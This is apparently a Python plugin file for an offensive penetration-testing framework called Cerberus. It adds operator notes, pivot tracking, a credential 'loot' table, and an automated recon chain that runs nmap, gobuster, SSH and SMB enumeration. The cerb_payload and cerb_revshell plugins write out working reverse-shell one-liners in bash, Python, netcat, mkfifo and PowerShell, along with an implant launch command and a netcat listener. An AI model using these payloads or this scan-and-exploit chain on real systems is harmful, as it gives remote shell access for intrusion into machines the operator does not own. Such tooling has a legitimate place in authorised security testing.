"""Cerberus-named workflow plugins inspired by  operator commands.

Naming: cerb_* for plugin registry; CLI exposes friendlier aliases.
"""

from __future__ import annotations

import asyncio
import shutil
from pathlib import Path
from typing import Any

from cerberus.core.ops import (
    add_note,
    add_pivot,
    add_task,
    list_notes,
    list_pivots,
    list_scan_files,
    load_tasks,
    loot_table,
    set_task_status,
    tgrep,
)
from cerberus.core.phase import Phase
from cerberus.core.plugin_api import OpsecLevel, Plugin, PluginMeta, register_plugin, get_plugin
from cerberus.core.plugin_api import discover_plugins


@register_plugin
class CerbNotePlugin(Plugin):
    meta = PluginMeta(
        name="cerb_note",
        description="Capture operator note for current target/phase ( note)",
        phase=list(Phase),
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        text = kwargs.get("cmd") or kwargs.get("prompt") or kwargs.get("text") or ""
        show_all = bool(kwargs.get("all"))
        if not text:
            notes = list_notes(
                self.config.sessions_dir,
                rhost=None if show_all else (self.config.rhost or None),
            )
            return {"success": True, "message": f"{len(notes)} note(s)", "notes": notes}
        entry = add_note(self.config.sessions_dir, text, self.config.rhost, self.config.phase)
        return {"success": True, "message": f"note saved [{entry['id']}]", "note": entry}


@register_plugin
class CerbPivotPlugin(Plugin):
    meta = PluginMeta(
        name="cerb_pivot",
        description="Record pivot target or show pivot chain ( pivot)",
        phase=[Phase.LATERAL, Phase.PRIVESC, Phase.EXFIL, Phase.REPORT],
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=["host"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        ip = kwargs.get("target") or kwargs.get("cmd")
        note = kwargs.get("prompt") or kwargs.get("payload") or ""
        if not ip:
            chain = list_pivots(self.config.sessions_dir)
            return {"success": True, "message": f"{len(chain)} pivot(s)", "pivots": chain}
        entry = add_pivot(self.config.sessions_dir, ip, via=self.config.rhost, note=str(note))
        self.evidence.add(
            kind="host",
            target=ip,
            data={"pivot_via": self.config.rhost, "note": note},
            source="cerb_pivot",
            plugin="cerb_pivot",
            confidence=0.7,
            tags=["pivot"],
        )
        return {"success": True, "message": f"pivot recorded {ip}", "pivot": entry}


@register_plugin
class CerbTasksPlugin(Plugin):
    meta = PluginMeta(
        name="cerb_tasks",
        description="Task queue: list / add / start / done ( tasks)",
        phase=list(Phase),
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        action = kwargs.get("cmd") or kwargs.get("action") or "list"
        # allow: add <text>, done <id>, start <id>, list, all
        parts = str(action).split(maxsplit=1)
        verb = parts[0].lower()
        rest = parts[1] if len(parts) > 1 else ""

        if verb in ("add", "new") and rest:
            t = add_task(self.config.sessions_dir, rest, self.config.operator)
            return {"success": True, "message": f"task {t['id']} created", "task": t}
        if verb == "done" and rest:
            ok = set_task_status(self.config.sessions_dir, rest, "Done")
            return {"success": ok, "message": f"task {rest} → Done" if ok else "not found"}
        if verb == "start" and rest:
            ok = set_task_status(self.config.sessions_dir, rest, "Started")
            return {"success": ok, "message": f"task {rest} → Started" if ok else "not found"}

        tasks = load_tasks(self.config.sessions_dir)
        if verb != "all":
            tasks = [t for t in tasks if t.get("status") in ("New", "Started")]
        return {"success": True, "message": f"{len(tasks)} task(s)", "tasks": tasks}


@register_plugin
class CerbLootPlugin(Plugin):
    meta = PluginMeta(
        name="cerb_loot",
        description="Unified credentials/hashes table ( l00t)",
        phase=list(Phase),
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        items = self.evidence.find(kind="credential")
        rows = loot_table(self.config.sessions_dir, items)
        return {"success": True, "message": f"{len(rows)} loot entr(y/ies)", "loot": rows}


@register_plugin
class CerbScansPlugin(Plugin):
    meta = PluginMeta(
        name="cerb_scans",
        description="List scan artefacts in sessions/ ( scans)",
        phase=[Phase.RECON, Phase.ENUM, Phase.REPORT],
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        host = kwargs.get("target") or kwargs.get("cmd")
        if host == "rhost":
            host = self.config.rhost
        files = list_scan_files(self.config.sessions_dir, host_filter=host or None)
        ports = self.evidence.find(kind="port", target=self.config.rhost) if self.config.rhost else []
        return {
            "success": True,
            "message": f"{len(files)} scan file(s), {len(ports)} port evidence",
            "scans": files,
            "ports": [{"port": p.data.get("port"), "service": p.data.get("service")} for p in ports[:50]],
        }


@register_plugin
class CerbTgrepPlugin(Plugin):
    meta = PluginMeta(
        name="cerb_tgrep",
        description="Search session notes/creds/logs ( tgrep)",
        phase=list(Phase),
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        pattern = kwargs.get("cmd") or kwargs.get("prompt") or kwargs.get("pattern") or ""
        if not pattern:
            return {"success": False, "message": "need pattern (cmd= or --prompt)"}
        hits = tgrep(self.config.sessions_dir, pattern)
        return {"success": True, "message": f"{len(hits)} hit(s)", "hits": hits}


@register_plugin
class CerbCtxPlugin(Plugin):
    meta = PluginMeta(
        name="cerb_ctx",
        description="One-line operator context: rhost/lhost/phase/creds ( ctx)",
        phase=list(Phase),
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        s = self.evidence.sitrep()
        creds = len(self.evidence.find(kind="credential"))
        from cerberus.core.c2 import get_c2
        c2 = get_c2()
        beacons = len(c2.beacons) if c2 else 0
        line = (
            f"rhost={self.config.rhost or '—'} lhost={self.config.lhost} "
            f"domain={self.config.domain or '—'} phase={self.config.phase} "
            f"stealth={self.config.stealth} hosts={s.get('host_count', 0)} "
            f"creds={creds} beacons={beacons}"
        )
        return {"success": True, "message": line, "ctx": line}


@register_plugin
class CerbPayloadPlugin(Plugin):
    meta = PluginMeta(
        name="cerb_payload",
        description="Generate reverse-shell / implant one-liners ( reverse_shell / msfvenom style)",
        phase=[Phase.EXPLOIT, Phase.PRIVESC, Phase.LATERAL],
        opsec=OpsecLevel.MEDIUM,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        lhost = kwargs.get("lhost") or self.config.lhost
        lport = int(kwargs.get("port") or self.config.lport or 4444)
        kind = (kwargs.get("cmd") or kwargs.get("type") or "bash").lower()
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "nce": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "powershell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}\"",
            "implant": f"CERBERUS_C2={lhost}:{self.config.c2_port} CERBERUS_KEY={getattr(self.config,'c2_key','')} ./cerberus-implant",
        }
        if kind == "all":
            return {"success": True, "message": "all payloads", "payloads": payloads}
        body = payloads.get(kind) or payloads["bash"]
        return {"success": True, "message": f"payload {kind} → {lhost}:{lport}", "payload": body, "kind": kind}


@register_plugin
class CerbEngagePlugin(Plugin):
    meta = PluginMeta(
        name="cerb_engage",
        description="Smart kill-chain: ping→nmap→service triggers→phase advance→recommend",
        phase=[Phase.RECON, Phase.ENUM, Phase.EXPLOIT],
        opsec=OpsecLevel.HIGH,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        from cerberus.core.config import save_config
        from cerberus.core.phase import Phase
        from cerberus.plugins.ai.recommend import recommend_next

        target = kwargs.get("target") or self.config.rhost
        if not target:
            return {"success": False, "message": "need target / rhost"}
        self.config.rhost = target
        save_config(self.config)

        discover_plugins()
        log: list[str] = []

        async def _run(step: str, **kw):
            cls = get_plugin(step)
            if not cls:
                log.append(f"skip {step}")
                return None
            plugin = cls(self.config, self.evidence, self.phase)
            try:
                result = await plugin.run(target=target, **kw)
                log.append(f"{step}: {result.get('message', result)}")
                return result
            except Exception as e:
                log.append(f"{step}: error {e}")
                return None

        await _run("ping")
        await _run("nmap_basic")

        # service-triggered follow-ups from evidence
        ports = self.evidence.find(kind="port", target=target)
        port_nums = set()
        for pitem in ports:
            try:
                port_nums.add(int(pitem.data.get("port")))
            except Exception:
                pass
        if port_nums & {80, 443, 8080, 8443, 8000}:
            await _run("http_probe")
            await _run("gobuster_dir")
        if 22 in port_nums:
            await _run("ssh_enum")
        if port_nums & {139, 445}:
            await _run("smb_enum")

        # advance phase when recon produced ports
        if ports and self.phase.current.value == "recon":
            try:
                self.phase.advance(Phase.ENUM)
                self.config.phase = "enum"
                save_config(self.config)
                log.append("phase: recon → enum")
            except ValueError as e:
                log.append(f"phase: {e}")

        rec = await recommend_next(self.config, self.evidence, self.phase, use_ollama=False)
        log.append(f"recommend: {[s.get('action') for s in rec.get('suggestions', [])[:3]]}")
        return {
            "success": True,
            "message": f"engage {target} complete",
            "log": log,
            "suggestions": rec.get("suggestions", []),
            "counts": rec.get("counts", {}),
        }


@register_plugin
class CerbSurfacePlugin(Plugin):
    meta = PluginMeta(
        name="cerb_surface",
        description="Render network surface from evidence ( surface)",
        phase=list(Phase),
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        hosts = self.evidence.find(kind="host")
        ports = self.evidence.find(kind="port")
        services = self.evidence.find(kind="service")
        pivots = list_pivots(self.config.sessions_dir)
        tree: dict[str, Any] = {}
        for h in hosts:
            tree.setdefault(h.target, {"ports": [], "services": [], "notes": h.data})
        for p in ports:
            tree.setdefault(p.target, {"ports": [], "services": [], "notes": {}})
            tree[p.target]["ports"].append(p.data.get("port"))
        for s in services:
            tree.setdefault(s.target, {"ports": [], "services": [], "notes": {}})
            tree[s.target]["services"].append(s.data.get("service") or s.data.get("server"))
        return {
            "success": True,
            "message": f"{len(tree)} host(s), {len(pivots)} pivot(s)",
            "surface": tree,
            "pivots": pivots,
        }


@register_plugin
class CerbRevshellPlugin(Plugin):
    meta = PluginMeta(
        name="cerb_revshell",
        description="Print listener command + matching reverse shell ( reverse_shell)",
        phase=[Phase.EXPLOIT, Phase.PRIVESC],
        opsec=OpsecLevel.MEDIUM,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        lhost = self.config.lhost
        lport = int(kwargs.get("port") or self.config.lport or 4444)
        kind = kwargs.get("cmd") or "bash"
        listener = f"nc -lvnp {lport}"
        # reuse payload plugin logic inline
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        if kind == "python":
            payload = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
        return {
            "success": True,
            "message": f"revshell {kind} {lhost}:{lport}",
            "listener": listener,
            "payload": payload,
        }
